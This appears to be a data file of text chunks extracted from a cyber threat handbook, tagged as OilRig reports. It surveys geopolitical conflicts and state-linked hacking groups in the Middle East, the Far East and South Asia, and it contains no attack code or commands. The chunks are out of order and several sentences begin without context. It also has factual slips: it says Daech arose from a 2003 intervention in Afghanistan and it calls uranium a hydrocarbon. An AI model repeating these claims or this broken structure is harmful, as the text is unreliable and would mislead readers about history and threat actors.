"Cybersecurity company Fortinet recorded more than 2.6 billion cyberattack attempts in Brazil between January and June 2020, out of a total of 15 billion attempts in Latin America and the Caribbean. COVID has also led to an increase in the use of phishing techniques by attackers. Cybercriminals would share messages on WhatsApp aiming to steal the victim’s personal data for use in future attacks or trick the victim into downloading legitimate applications in order to collect payment from affiliate programmes.

"Monarchies Republics Influence of the Arab Spring: Fall of the government, civil war, prolonged demonstrations with or without repression

Contextual analysis of Western Asia and geocyber risks The Middle East is a region geographically and culturally diverse. It comprises the Anatolian zone with present-day Turkey, the Levant zone, which includes Syria, Lebanon, Jor-

dan, Israel and the Palestinian Territories, the Arabian Peninsula and the Iraq-Iran zone. Geographically, the Middle East is rich in natural resources and especially in oil and gas. Cultu-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|59e8bfc8d57045eaa93508dcfc24ca84
"_THE ARAB SPRING AND ITS IMPACT ON THE MIDDLE EAST In 2011, a wave of democratic protests swept across various countries in the Arab world. From Tunisia, the desire of the North African peoples for democracy spread to Western Asia, leading to radical responses, severe repression (Kuwait) and even civil wars (Syria, Yemen). Initially, these protests took the form of peaceful demonstrations, where people expressed their disagreement with the political and institutional systems, which they deemed obsolete and corrupt. The Middle Eastern region is built around two types of political models: absolute or constitutional monarchies and republics. Many of the most important uprisings were in the Arab republics and have continued to this day in the form of civil wars, most notably in Syria and Yemen. The countries of the Arabian Peninsula, most of which are rentier states, have effectively established an unspoken social contract by offering a high standard of living for their populations.

_SECURITY AND TERRORISM IN THE REGION Since the late 1980s, the Western Asia region has seen the emergence of terrorist groups advocating radical Islam and encouraging its political manifestation in the 44

form of a violent jihad. Jihad has experienced several mutations. It was theorized as a violent struggle against the near enemy, which refers to the apostate regimes of the Middle Eastern peninsula. The first mutation appeared with Al-Qaeda. The group exported jihad across regional border and started to target the “far enemy”. Al-Qaeda first appeared in Afghanistan in 1987 and has carried out numerous terrorist acts, claiming responsibility for the attack on the twin towers of the World Trade Center in New York

in September 2001. The group is still active in various parts of North Africa and the Middle East, with the presence of Al-Qaeda in the Islamic Maghreb (AQIM), the Arabian Peninsula (AQAP) and the Indian subcontinent (AQIS). The second major mutation happened with Daech. The terrorist group created a horizontal structure, relying on the masses. Formed in response to America’s intervention in Afghanistan in 2003, it is mainly present in Iraq, where it has its organisational core. It is also"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|95a89e8410f24e8cbf87bd6f58add8e3
present in North Africa, the Caucasus, Somalia, Southeast Asia and the Indian subcontinent. In 2014, Abu Bakr al-Baghdadi proclaimed the creation of an Islamic State in Iraq. The Islamic State group took part in the Syrian conflict in 2013, fighting both Kurdish militias and Syrian regime forces, with the aim of establishing an Islamic caliphate. Building on an existing terrorist group in the region, the Al-Nusra Front, Islamic State became the Islamic State in Iraq and the Levant (ISIL). _ON 4 APRIL 2016, THE CYBER CALIPHATE ARMY (CCA), ISIS’S MAIN HACKING UNIT, AND OTHER PRO-ISIS GROUPS LIKE THE SONS CALIPHATE ARMY (SCA) AND KALACNIKOV.TN (KTN) MERGED TO FORM THE UNITED CYBER CALIPHATE (UCC). UCC GROUPS INCLUDE: • The Cyber Caliphate, or Cyber Caliphate Army (CCA), which was created shortly after Islamic State was formed. The key person in this organisation was Junaid Hussain (Abu Hussain al-Britani), or TriCk. CCA’s most significant cyber terrorist attack was in January 2015, when the Twitter and YouTube accounts of US Central Command and later the Twitter accounts of Newsweek magazine were hacked. • The Sons Caliphate Army (SCA)|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5867c24db1614a6e85367e1e70436ecc
"was formed in 2016 as a subgroup of the Cyber Caliphate. It is mostly known for disrupting social media traffic on Facebook and Twitter. SCA claimed to have hacked into 10,000 Facebook accounts, over 150 Facebook groups and more than 5,000 Twitter profiles. • Kalashnikov E-Security Team was initiated in 2016. This group focuses on technology security consulting for ISIS jihadists. It has uploaded ISIS-related jihadist literature, shared posts from cyber jihadist groups, reported successful attacks on websites or Facebook pages and published various web hacking techniques. Over time, the hackers began to carry out or take part in website hacking. While we have not identified any ATK133 attacks in almost two years, it is highly likely that group members have been redeployed to new operations within other terrorist groups as a result of ISIS movements.

_CIVIL WAR IN SYRIA AND YEMEN When Yemeni President Ali Abdullah Saleh was forced to accept the terms of the revolutionaries under the mediation of the Gulf Monarchies in 2011, no one thought the country would collapse.

Iran, in order to regain power. The country was plunged into a conflict that became international in 2015 with the intervention of a Saudi-led Arab coalition. In Syria, the democratic aspirations of 2011 quickly degenerated into a civil war sparked by the killing of children in Daraa by Bashar al-Assad’s regime. As with Yemen, the conflict became international when Islamic State got involved in 2013. What began as a national conflict quickly turned into a regional and international conflict in which Russia, Iran and Turkey have taken part. Russia and Iran have sent militias to support President Assad’s regime and its strategic interests in the region. Turkey sent in its armed forces in late 2019 after the US withdrawal from the region, officially to protect its borders and fight jihadists. Unofficially, Turkey has also been fighting the Kurds, with whom it is in conflict within its borders. This Kurdish population, present today in northern Syria but also in Turkey, Iraq and Iran, claims a territory in Syria’s north. The Kurds, a minority which has suffered for many years under the Assad clan, were spread over a territory straddling Iran, Iraq, Turkey and Syria, before the borders of these countries were defined at the end of World War II. _USE OF CYBER WEAPONS IN THESE CONFLICTS: THE EXAMPLE OF SYRIA These conflicts also have a dimension that is much less reported in the media because it is less visible: cyber confrontations.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a473a9e709f84420ac47ad1152f1ebfe
"In this respect, the Syrian conflict demonstrates the importance of the cyber weapon and its use by the regime of Bashar al Assad. Firstly, the cyber tool allows the regime to carry out missions to spy on the opposition. The technique known as «man in the middle» allows the interception of communications between two stations without either operator being aware of it1. Infowar Monitor reported in May 2011 that this type of attack was used in Syria on a secure version of Facebook, allowing the attacker to access the victim’s private conversations. Still with the objective of espionage, the Syrian government has used RATs (Remote Administration Tools), proCyber Threat Handbook | 45"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|cac41cbe5d2d490cbaec433d38871acc
Geographical zones grams that allow full remote control of a computer from another device. DarkComet is a French-made RAT that has been modified to spy on Syrian revolutionary forces. Secondly, the Damascus regime uses the cyber tool to destabilize its opponents. For example, the Syrian government regularly cuts off the country’s communications to interfere with the rebels’ exchanges. In addition to cutting off the Internet and GSM networks at strategic times, it may send a large number of connection requests in order to saturate the network. The Syrian leaders regularly mobilise hacker groups, such as ATK132 (Syrian Electronic Army) which carry out DDoS (distributed denial of service) or defacement attacks. Certain Arabic media outlets are regularly targeted by the Syrian Electronic Army (SEA). For example, the website of the Qatar-based Al Jazeera news channel was hacked by the SEA in April 2012. At the same time, the Twitter account of Al Arabiya, a Saudi Arabian television news outlet, posted bogus messages about an explosion at a Qatar gas facility, the replacement of Qatar’s Prime Minister and Foreign Affairs Minister and the arrest of the Prime Minister’s daughter in London. The SEA was almost certainly seeking to exacerbate the tensions between Qatar and Saudi Arabia in order to undermine their partnership on the Syrian issue.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|897bfa39991948d3818b8fbae9941a5e
"In January 2013, the Syrian Electronic Army announced that it had several documents detailing the role played by Turkey, Saudi Arabia and Qatar in the Arab world for nearly two years. This information was later published on the website of Al Akhbar, a Lebanese newspaper that is reputedly pro-Hezbollah. This type of initiative is frequent and the countries targeted are always those that take an official position against Bashar al-Assad and that are accused by the Syrian government of militarily supporting the opposition. _STRUCTURE OF THE CYBERTHREAT GENERATED BY THE ASSAD REGIME The Pat Bear group (ATK85) should not be confused with the SEA, though it is related to it. The SEA emerged in 2011 to support the Assad government in the civil war, then the regional war. Its objective was to 46

support the President’s image and positions in a context of dissent and violence against civilians. Logically, the group uses website defacement, spam, phishing and DoS techniques, especially against opponents of the regime. In 2014, the Golden Rat group (ATK80) appeared. This group also came out of the SEA, but it does not have the same missions. It specialises in espionage and mainly directs its actions at the national level. Pat Bear emerged in 2015 with the objective of launching cyber offensive operations against the Sy-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|8d97ca8518f2420e9555021e6b0174f9
"(Syria, Yemen, etc.). This opposition is also evident in the realm of cyberthreats. _A BIPOLAR CONFIGURATION REFLECTED IN CYBERSPACE IIt appears that the Saudi bloc is partly supported by the ATK144 group (DarkMatter, Project Raven). Project Raven is a threat group that has been conducting targeted spyware attack campaignsagainst Emirati journalists, militants, activists and dissidents since at least 2012.

Circumstantial evidence suggests that there could be a link between this group and the United Arab Emirates (UAE) government. Project Raven is the offensive and operational division of the National Electronic Security Authority (NESA), the UAE equivalent of the NSA.

Raven’s targets include militants in Yemen, foreign adversaries such as Iran, Qatar and Turkey, as well as specific individuals.

These groups have specialised in destructive wiper malware attacks such as Zerocleare and Shamoon. These are regularly directed against vital Saudi organisations. _THE 2017 QATAR CRISIS: A SYMPTOM OF A BIPOLAR STRUCTURE From the 1990’s, Qatar gradually broke away from the Saudi “bloc” to demonstrate its independence and moved closer to Iran. In June 2017, after some comments allegedly made by the Emir of Qatar in which he praised Iran, Hezbollah and the Muslim Brotherhood, the petro-monarchies of the gulf severed diplomatic ties with Qatar. On 16 July 2017, the Washington Post claimed, based on sources from the US Secret Service, that the statement from the Emir originated from a computer hack perpetrated by the UAE. The objective of destabilizing the Qatari emirate and asserting Saudi power in the region has proven to be counterproductive, as witnessed by the rapprochement between Qatar and Iran. Above all, this crisis reveals the fragmentation of the Middle East around the opposition between Sunni Wahhabi Saudi Arabia and Shiite Iran. This confrontation is not simply religious, with Sunnism and Shiism, or cultural through Arab or Persian influences, but geopolitical with a desire for power and influence in the Western Asia zone.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|bb4939bb5b2342c5b0317a8020c6a806

today is the capital of both Israel and Palestine. In 1948, the declaration of independence of the Jewish State in Palestine, which then became Israel, led the member countries of the Arab League to contest and take armed action against it. Numerous confrontations between Arabs and Jews ensued in the second half of the 20th century, and countries outside the conflict took a position. What the Arab League contests is Israel’s policy of expansion, which it considers illegitimate. The Palestinians do not hesitate to protest against this policy, and various terrorist movements have been born out of this conflict. One example is Hamas, which carried out suicide attacks until 2005 and now focuses on attacks on Israeli cities. In response, Israel has stepped up its militarisation and accelerated the process of expansion into the Palestinian territories. In early 2021, clashes in Gaza, under Israeli control, flared up again like a recurring theme. They serve as a reminder that the issue of territo-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7d4015961a1c4c29945800a4dd030f86
"ry that divides Israel and Palestine is as contentious as ever, many decades after the conflict began. The conflict has given rise to several hacker groups, which structure their actions around this issue. _ATK89 (MOLERATS, GAZA CYBERGANG) IS A POLITICALLY MOTIVATED GROUP. IT IS ACTIVE WORLDWIDE, INCLUDING IN EUROPE AND THE UNITED STATES, BUT MAINLY IN THE MIDDLE EAST AND NORTH AFRICA (MENA) AND PALESTINE. THE GROUP IS COMPOSED OF THREE SUBGROUPS: • Gaza Cybergang Group 1 (aka MoleRATs).

It focuses on espionage and targets executive and judicial bodies around the world, but mostly in the MENA region, especially Palestine. The group has used malware with CMD/PowerShell commands for its attacks. Each group is different in its TTPs (tactics, techniques and procedures), but they all use the same tools after taking control of their victims. ATK89 seems to still be active. In late 2020, it added two new backdoors (DropBook and SharpStage) to its arsenal as well as a downloader (MoleNet) in order to target Israel in particular. ATK66 (APT-C-23) is commonly regarded as an APT group linked to the ruling Hamas organisation in the Gaza Strip. The group was reportedly formed in 2011, but it became active in 2014, when the first attacks were detected in the wild. By examining its victims and TTPs, it is apparent that the group mainly attacks targets related to the Palesti48"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|36c2855ab19846c58d55fec62b3412e5

One of the most recent ATK66 campaigns began in Palestine in late 2020 and targeted people in the same region, including government officials, members of the Fatah political party, student groups and security forces.

_FINANCIAL RETURNS FROM HYDROCARBONS AS A POLITICAL DRUG The region is also rich in hydrocarbons (oil and uranium), which ensures that the countries of the Persian Gulf and Arabian Peninsula benefit from significant financial returns. As a result, these countries satisfy the primary needs of their populations, such as medical care and social infrastructure (universities, etc.) and even exempt them from taxes. Hydrocarbons are like a drug in the Middle East. Internally, the rentier countries enjoy the satisfaction of substantial and continuous income streams. However, this income is dependent on world prices, which can create a kind of “withdrawal” effect. This serves as a geopolitical lever in the region, especially in the"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|6a456df60c104a24947727a25011ae8e
"context of the Iran-Saudi Arabia proxy conflict. Riyadh and Tehran are among the best supplied with hydrocarbons and the largest producers in the region. In 1960, they helped create the Organisation of the Petroleum Exporting Countries (OPEC) but soon began to display doctrinal divergences, especially at the Caracas summit in 1977, where the members aligned around Saudi Arabia’s productivist vision. Since the 1980s, Saudi Arabia has increased its production in order to bring down the price per barrel and put financial pressure on Iran. The Iranian economy, which was not diversified at the time, was quickly hit by American sanctions in the 1990s. In the future, this energy lever could pose a significant risk of geopolitical destabilisation and lead to an increase in the level of cyberthreat.

Conclusion As we have seen, the Middle Eastern cyberthreat landscape is shaped by several geopolitical factors. The region is highly polarised around a fundamental divergence between Saudi Arabia and Iran. This polarisation takes the form of a subre-

gional Cold War with a “bloc” logic that is often reduced to a simple opposition between Sunnis and Shiites, but which in reality is much more complex. These two blocs confront each other indirectly in war zones such as Syria and Ye-

men, as well as through militia or Islamist intermediaries. Ultimately, this complexity is transposed into cyberspace with an array of hacker groups and a sustained level of activity."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|53b08da8c0a443daa03f9fa05029c42e

economic sanctions against South Korea in 2017. These sanctions follow South Korea’s agreement to host America’s Terminal High Altitude Area Defense (THAAD) anti-ballistic missile defence system4. On the other hand, relations between ASEAN, Japan and the two Koreas remain cordial. The Far East appears as a breeding ground for cyber threats. At the regional level, a decisively important game is clearly being played out, fuelled by China’s desire to influence the zone and the responses of the other countries. Agendas are also being played out in smaller arenas, as we will see with the Korean question."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|917736478f504a749c9609759f6a2b3d
_THE FAR EAST AND CHINESE POWER Over the last decade, the cyberthreat landscape in this region has been greatly impacted by the growing influence of China as an economic, political and cultural player. China has sought to structure its presence by creating international organisations in the region and using them to exert its influence. Furthermore, the New Silk Roads project launched by Chinese President Xi Jinping in 2013 directly serves Chinese foreign policy. This project is supported by organisations with significant funds, such as the Asian Infrastructure Investment Bank (AIIB). Today, China is a key player in the region and has been competing with the Western powers for the last decade. The growth of China as a focal point has prompted the other Far Eastern countries to adopt a cautious posture with respect to Beijing. For the main countries of the zone, two objectives are emerging: that of creating counterweigts to Chinese influence with the aim of strategic rebalancing, and that of maintaining a peaceful relationship with Beijing in order to preserve the economic ties. Within the Association of Southeast Asian Nations (ASEAN), for example, trade between China and its southern interface has created a strong interdependence, so much so that China has become the largest trading partner in the zone1. 52|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|92298994553f4326a8a65102b3139861
"_A REGIONAL STRUGGLE FOR INFLUENCE REFLECTED IN CYBERSPACE From a geostrategic viewpoint, Chinese domination is often presented as overwhelming and hard to contest. Yet the cyber tool creates a discrepancy in this logic of seemingly one-way domination. Indeed, the level of discretion and military effectiveness of this weapon allows for a strategic rebalancing. This creates opportunities for other players to assert themselves in the region. This is evidenced by the activity of several APT groups seeking to be counterweights to Chinese influence. _SIGNIFICANT ACTIVITY BY GROUPS OF CHINESE ORIGIN There are no less than 45 ATK groups, known under more than 200 aliases, which appear to originate in China.

In turn, Japan has established trade with the various countries in the region and has maintained relations with China, despite a difficult shared history and China’s claim to certain islands in the archipelago. Tensions between the two countries are ongoing in the East China Sea over the delimitation of their exclusive economic zones (EEZs). North Korea is heavily reliant on

China, which accounted for 90% of its trade before the Covid-19 crisis2. In addition, North Korea remains the only country with which China has signed a defence treaty3. Seoul remains relatively close to Beijing, with regular bilateral talks, which began to normalise in late 2019. Trade between the two countries is extremely limited, however, since China introduced"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|7ca6ce069f514d698707e79ba53eb52e
_THESE GROUPS SHARE A LOT OF TOOLS AND MALWARE WITH EACH OTHER, WHICH MAKES IT DIFFICULT TO DELINEATE THEIR ACTIVITIES In 2014, the ATK34 group (Goblin Panda) aided by the 1937CN group5, launched cyber-espionage operations on Vietnam’s oil sector. In 2016, the same two groups carried out sabotage operations on the country’s transportation sector, then in Au-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|876b812fa621483a9d8ba7daaa7c08d9
gust 2017 attacked its political institutions. This attack came a few days after the re-emergence of tensions around control of the South China Sea between China and Vietnam, which is set against the backdrop of historic discord over the Paracel Islands6. On 5 August 2017, the meeting of foreign ministers of ASEAN countries in Manila had resulted in a resurgence of tensions provoked by Vietnam against China. In addition to the ATK34 group, of which Goblin Panda is a part, the ATK1 group (Lotus Blossom) regularly attacks the region. Before 2013, one of the group’s hackers called Elise installed backdoors on Southeast Asian networks, focusing especially on electronics manufacturers and telecommunication companies, which enabled attackers to penetrate the systems7. In 2015, ATK1 conducted massive espionage campaigns aimed at government and military organisations across Southeast Asia8. These campaigns, whose objective was to weaken political organizations and spy on group members, are still ongoing. The most prominent example is the ASEAN, which suffered from a cyber espionage attack operated by ATK1 in January 20189. Other groups, considered less prolific, appear to be more responsive to a political agenda. ATK34’s campaign of attacks on Vietnamese institutions in August 2017, for one, reflects intensifying tensions with China. The ATK29 (TEMP.Periscope) group has also demonstrated its ability to exploit local contexts and leverage them into cyber attack opportunities.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|23aaf8dfbef840b3bbba7fff4d68ac90
ATK29’s campaign in Cambodia in July 2018 during the legislative elections is indicative of this trend. ATK29 group is interesting because the first evidence of its activity dates from the start of the Silk Roads project in 2013. Initially focusing on the maritime domain, its range of targets was later extended to the defence, transportation, engineering and space sectors. In recent campaigns, it has directed its attacks at the countries involved in the Silk Roads project, reflecting a shift in targets and paradigm. Its activities have turned more particularly to industrial espionage and destabilisation. It was to this end that ATK29 targeted Cambodia in July 2018. From September 2017, the country had been plunged into si-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|e1e382f620aa4ad088fa8df65d6d3f99
gnificant political stagnation, making the attack all the easier. The leader of the Cambodia National Rescue Party (CNRP) had been charged with treason and spying by Prime Minister Hun Sen10. He had also dissolved the CNRP, the only opposition party, ahead of the July 2018 legislative elections, which is when the attack occurred. This created an opportunity for the Chinese actor to leverage its cyber arsenal to gain high visibility on Cambodian politics and the actions under consideration by the government. A similar scenario happened in the Philippines in 2015. China refused to take part in an arbitration procedure with the Philippines at the Permanent Court of Arbitration (PCA) in The Hague to settle territorial issues in the Philippine Sea. In the same year, Barack Obama raised the issue of control of the South China Sea at the Asia Pacific Economic Cooperation (APEC) Summit, which was endorsed by the host country, the Philippines11. Shortly after, ATK29 (NanHaiShu) attacked the Philippine Department of Justice12. _VIETNAM AND THE ATK17 GROUP (APT32) VIETNAM ALSO MAINTAINS THIS STANCE OF NON-SUBMISSION TO ITS GIANT NORTHERLY NEIGHBOUR Relying on a highly successful group called ATK17 (APT32), Vietnam conducts almost continuous espionage campaigns against diverse but well-defined targets. The techniques implemented by ATK17 include the use of decoy documents that allow for initial access to multiple platforms (Windows and MacOS in particular).|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|30753143dc734ea2a5624fdf7688fed5
"The group was thus able to achieve its objectives by carrying out numerous attacks against Chinese interests. SOUTH KOREA IS ALSO RESPONDING TO CHINESE PRESSURE. KOREAN-SPEAKING GROUP ATK52 (DARKHOTEL) IS VERY ACTIVE AGAINST CHINA While some experts link this threat actor to North Korea, especially given the overlap between it and ATK4 (APT37), the consensus is that it is Cyber Threat Handbook | 53

actually linked to South Korea. It targets government entities, especially in the areas of diplomacy, defence and justice. Its activity is focused in particular around the Sea of Japan and the East China Sea. Its purpose is to spy on specific people, especially Chinese individuals. The group leverages its cryptographic skills to produce fake certificates and use zero-day. It also has access to an extensive and reliable network infrastructure, which enables it to maintain long-term access to its targets. _THE PHILIPPINES AND THE NATIONAL BRANCH OF THE LULZSEC MOVEMENT TK129 (Pinoy LulzSec) is the Philippine branch of the international LulzSec movement, embracing its anarchist ideology. According to statements by its members, ATK129 has been active since 2012, with a surge of its activity in 2017 and 2018. In April 2019, the Philippine government and its defence institutions and industry were the victims of an April Fools’ targeted campaign. The hackers conducted dozens of attacks during these campaigns, mainly website defacement and theft of data, which was then leaked on online file sharing platforms. The hackers primarily attacked government-related targets, but they also targeted the education sector. These campaigns against the Philippine government came after President Duterte signalled a rapprochement with China."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|56b1928ceb794399b429d5f2a1b79a71
"More recently, the group’s attacks have directly targeted the People’s Republic, with the idea to pursue efforts to defend the country’s sovereignty against Chinese influence. _TAIWAN AND THE ATK153 GROUP (APT-C-01) Taiwan, with Hong Kong, is one of the states most subject to Chinese pressure and cyberattacks by groups believed to be based in China. However, the island state is supported by ATK153 (APT-C-01), an APT group that has been conducting cyber-espionage campaigns against key Chinese units and departments

such as government, national defence, science and technology, education and maritime agencies for 11 years. The group mainly targets the defence industry in connection with strategic issues such as Chinese-US relations, Cross-Strait relations and maritime-related issues. This 11-year series of cyber-espionage campaigns in China includes no less than 15 major attacks on Chinese strategic interests. _THE KOREAN CHESSBOARD Contrary to appearances, the Asian chessboard is not only structured around China as the focal point. The Korean conflict is ongoing and is guided and shaped independently according to its own logics. On July 27, 2021, the two Koreas decided to re-establish communication channels, witnessing a rapprochement. Diplomatic ties had been cut a year earlier, as a result of the stalled discussions. This resumption of dialogue comes at a time when North Korea is going through a crisis related to the decline of its agricultural production, causing food shortages in the country. The history between the two countries is complex and periods of escalation have followed periods of relaxation. The rapprochement, initiated in the late 1990s around economic assistance, ended in 2008 with the arrival in power of the conservative Lee Muyung-bak. The dispute over the disputed maritime zone regularly results in deaths on both sides and the escalation of tensions often lead to surges in cyber-activity from both sides."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|80a973c11bcf4920be80e1a58d6f8e1d
"Conclusion Contextually, the cyberthreat in the Far East is primarily driven by the rise of Chinese influence. For over a decade, this geopolitical focal point has prompted threat groups in the region to step up their activities in support of the national interests of their respective countries. However, the cyberthreat is not only driven by these regional factors. Certain geopolitical spaces have specific features linked to their historic context, as is the case with the Korean peninsula.

funds for the country and is believed to be the source of the Wannacry attack in 2017. ATK4 (APT37) appears to be a more independent group, specialising in cyber espionage of foreign interests, especially in South Korea.13

_THE MANY KNOWN ATTACKS TO DATE ARE STRUCTURES AROUND TWO EMBLEMATIC GROUPS On the South side, ATK52 (DarkHotel), regularly targets North Korean interests, reinforcing the hypothesis of a South Korean origin. In the North, the People’s Democratic Republic relies on the Lazarus nebula to carry out espionage and destabilization missions on its southern neighbour and attack it. Lazarus comprises several known entities. ATK117 (APT38, Bluenoroff) specialises in recovering

_AFGHANISTAN:

THE UNSTABLE STATE

_INDO-PAKISTANI TENSIONS AND KASHMIR The conflict between India and Pakistan began in 1947, when the two countries gained independence and the British Raj was split in two. Pakistan is a predominantly Muslim country that was formed as the Islamic Republic of Pakistan. India, conversely, is a secular state that inherited much of the territory of the Raj. Shortly after independence, the First Indo-Pakistani war took place in Kashmir. The Kashmir region, independent since 1947, spans territories claimed by India, Pakistan and China. Pakistan and India lay claim to all of these territories. Reflecting this complex heritage, the population of Kashmir is now predominantly Muslim, but it is ruled by a Hindu Maharaja. This first war ended in 1949 after the United Nations brokered a ceasefire agreement based on a future Line of Control (LoC). Since the LoC was established, Kashmir has been a region in two parts: Indian Kashmir and Pakistani Kashmir. The Line of Control has become a militarised zone, with the Indian and Pakistani armies facing 58"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|56a81f6f76474866b969a266e3c8b20b
less, current tensions are high, and groups of cyberattackers, suspected to be from both countries, regularly conduct operations against each other’s security forces. After the February 2019 suicide attack, the number of cyberattacks increased. On the Pakistan side, ATK64 (alias Mythic Leopard) is a Pakistan-based group whose operations are most likely conducted from Karachi. It uses social engineering and spear phishing to target Indian military and defence entities. On the Indian side, ATK11 (alias Patchwork) is a cyber espionage group active since at least 2010. One of its specific techniques is the use of code copied and pasted from multiple online forums combined with high-quality social engineering. It began with Operation Hangover, the purpose of which seemed to be surveillance of targets of national security interest to India, such as Pakistan and the Nagaland movement. The group was also involved in the Monsoon campaign, which targeted various sectors in India’s neighbouring countries.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|714e524acdfc4c4ea4d538857a0f6e8d
"off across the divide. The Indo-Pakistani conflict remains crystallized on the Kashmir issue. Today, the border between India and Pakistan is considered one of the most dangerous in the world. On 14 February 2019, tensions between Pakistan and India reignited when a suicide attack claimed by Pakistan-based Islamist group Jaish-e-Mohammed (JeM) killed 41 Indian soldiers. The attacker was a 20-year-old Kashmiri rebel, whose act led to a resurgence of military activism in the region. Narendra Modi, Prime Minister of India since 2014, condemned the attack and announced that there would be a response. On 18 February, in retaliation, India conducted an armed raid in the area where the attack had taken

place. Nine people were killed in the town of Balakot, where a JeM training camp is located. The resurgence of terrorist attacks in the region is worrisome for the Indian government, which is using all possible means to protect against them. Since both countries are nuclear powers, and the border between them is one of the most militarised in the world, an open conflict would be devastating for the region. _FOR THIS REASON, THE CYBER LEVER APPEARS THE BEST WAY FOR EACH SIDE TO ASSERT ITS CLAIMS Indo-Pakistani tension is mostly latent, with no open and direct confrontation since 1971. Nonethe-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d69711f3e6ed46d6b9da5fc377726103
India and Pakistan have different relationships with Afghanistan. Historically, each country’s bilateral relations with its Afghan neighbour have oscillated between long-term support projects and containment actions linked to the presence of the Taliban. India was the only South Asian country to recognise the Soviet-backed Democratic Republic of Afghanistan in the 1980s. In turn, Pakistan suffered destabilisation attempts perpetrated by the Soviets and implemented by the Afghan government with the objective of arming Pakistan’s Pashtun independence fighters so they could overthrow the regime of the time. Since then, Pakistan has continued to treat its westerly neighbour with suspicion. With the rise of the Taliban movement, both countries have maintained their course of action. India supported the then regime, helping overthrow the Taliban, while Pakistan has been regularly accused by Afghanistan of funding the mujahideen through its Inter-Services Intelligence (ISI). Before the Taliban came to power,|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d8f24a3656bd4631ba98e71865c79f9c
India provided Afghanistan with substantial aid (it was the fifth largest contributor in 2017 with $3 billion) and maintained its stance toward the Taliban. However, the summer 2021 was marked by a formal meeting between Taliban leaders and an Indian delegation in Qatar. Relations between Pakistan and the Taliban are more complex, especially since the Taliban announced that it does not recognise the Durand Line, which marks the border between the two countries. Furthermore, Pakistan, like Afghanistan, has suffered Taliban attacks on its soil, which has prompted the two countries to cooperate more closely in recent years. Despite Afghanistan’s instability and this historic context, both India and Pakistan are trying to cooperate with their neighbour. Notably, Pakistan has reached a Memorandum of Understanding with Afghanistan for the establishment of the Afghanistan-Pakistan Transit Trade Agreement (APTTA) and the construction of a rail link between the two countries. This cooperation may extend to joint defence and intelligence sharing operations. In turn, India, which historically has a stronger relationship with Afghanistan, has set up agricultural development projects on Afghan territory and, in the last decade, several hundred Afghan soldiers have been trained at Indian institutions.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|775c6cda84d74bef89a88d07a41869c1
"_DESPITE THESE PARALLEL BILATERAL COOPERATIONS, WHICH REMAIN IN PLACE TODAY, CYBER OPERATIONS ARE STILL BEING CONDUCTED For example, the ATK64 group (Transparent Tribe, APT36), suspected of being sponsored by Pakistan, has repeatedly targeted Afghanistan in espionage operations. The most recent attacks were in July 20211. Another attacker group known as SideCopy APT, affiliated with Pakistan, has led attack campaigns against public and private organizations in South Asia, including ministries in India and Afghanistan. In 2021, some of the most notorious victims included Afghanistan’s ministries of finance and foreign affairs, the administrative office of the Afghan president, and a computer containing the credentials of

the Indian government and education departments. In the case of the attacks against Afghanistan, the attacker was able to exfiltrate numerous personal documents including diplomatic visas as well as the IDs of Afghan government officials. SideCopy APT uses fake documents as well as Trojan Horses distributed via spear-phishing techniques2."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3099ac136ab34943bad4be39a711d453
"_COMMITMENT TO REGIONAL INTEGRATION _SOUTH ASIAN ASSOCIATION FOR REGIONAL COOPERATION At the regional scale, the eight South Asian countries created the South Asian Association for Regional Cooperation (SAARC) in 1985 to promote cooperation between member states and drive economic development. This regional organisation has permanent links with the United Nations as an observer. It has also developed ties with other regional organisations such as the European Union. In 2006, SAARC created the South Asian Free Trade Area (SAFTA) encompassing 1.6 billion people. At the local level, cooperation projects are emerging. In 2015, the gas pipeline project linking four South Asian countries, namely Turkmenistan, Afghanistan, Pakistan and India, was born. This project, which allows the countries to achieve greater energy autonomy, strengthens the ties between the South Asian states. These various cooperation projects, aimed at better regional integration and economic development, are also intended to give the countries in the region greater autonomy with respect to neighbouring powers. The region is surrounded by China to the north and east and by Iran to the west. It should also be noted that Russia, further north, has a historic influence in the region. This influence has been achieved by cyberthreat actors suspected of being sponsored by these neighbouring powers.

Conclusion

